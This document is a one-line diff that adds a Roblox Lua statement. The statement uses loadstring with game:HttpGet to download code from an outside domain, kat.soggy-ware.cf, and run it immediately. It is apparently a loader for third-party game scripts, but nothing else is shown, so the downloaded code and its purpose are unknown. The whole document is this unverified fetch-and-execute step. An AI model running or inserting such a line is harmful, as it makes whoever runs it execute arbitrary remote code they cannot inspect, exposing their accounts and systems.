@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://kat.soggy-ware.cf"))()
